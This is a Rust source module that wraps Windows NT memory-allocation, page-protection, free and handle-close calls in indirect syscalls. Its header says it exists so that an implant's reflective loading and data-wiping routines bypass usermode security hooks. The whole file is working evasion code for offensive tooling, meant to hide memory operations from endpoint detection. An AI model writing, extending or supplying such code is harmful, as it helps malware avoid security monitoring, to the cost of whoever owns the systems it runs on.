//! Local-process memory primitives via CallGhost indirect syscalls.
//!
//! Replaces kernel32 VirtualAlloc / VirtualProtect / VirtualFree so reflective
//! loading and wipe paths do not go through usermode hooks.

use callghost::syscall;
use core::ffi::c_void;

const CURRENT_PROCESS: isize = -1; // NtCurrentProcess
const MEM_COMMIT: u32 = 0x1000;
const MEM_RESERVE: u32 = 0x2000;
const MEM_RELEASE: u32 = 0x8000;

/// Allocate `size` bytes in the current process with the given page protection.
/// Returns the base pointer on success.
pub unsafe fn allocate(size: usize, protect: u32) -> Option<*mut u8> {
    let mut base: *mut c_void = core::ptr::null_mut();
    let mut region_size = size;
    let status = syscall!(
        indirect,
        NtAllocateVirtualMemory,
        CURRENT_PROCESS,
        &mut base,
        0usize,
        &mut region_size,
        MEM_COMMIT | MEM_RESERVE,
        protect
    );
    if status == 0 && !base.is_null() {
        Some(base as *mut u8)
    } else {
        None
    }
}

/// Change page protection on an existing region. Returns true on NT_SUCCESS.
pub unsafe fn protect(base: *mut u8, size: usize, new_protect: u32) -> bool {
    let mut addr = base as *mut c_void;
    let mut region_size = size;
    let mut old: u32 = 0;
    let status = syscall!(
        indirect,
        NtProtectVirtualMemory,
        CURRENT_PROCESS,
        &mut addr,
        &mut region_size,
        new_protect,
        &mut old
    );
    status == 0
}

/// Free an entire region previously allocated with [`allocate`].
pub unsafe fn free(base: *mut u8) {
    if base.is_null() {
        return;
    }
    let mut addr = base as *mut c_void;
    let mut region_size: usize = 0;
    let _ = syscall!(
        indirect,
        NtFreeVirtualMemory,
        CURRENT_PROCESS,
        &mut addr,
        &mut region_size,
        MEM_RELEASE
    );
}

/// Close a kernel handle via NtClose.
pub unsafe fn close_handle(handle: *mut c_void) {
    if handle.is_null() {
        return;
    }
    let _ = syscall!(indirect, NtClose, handle);
}
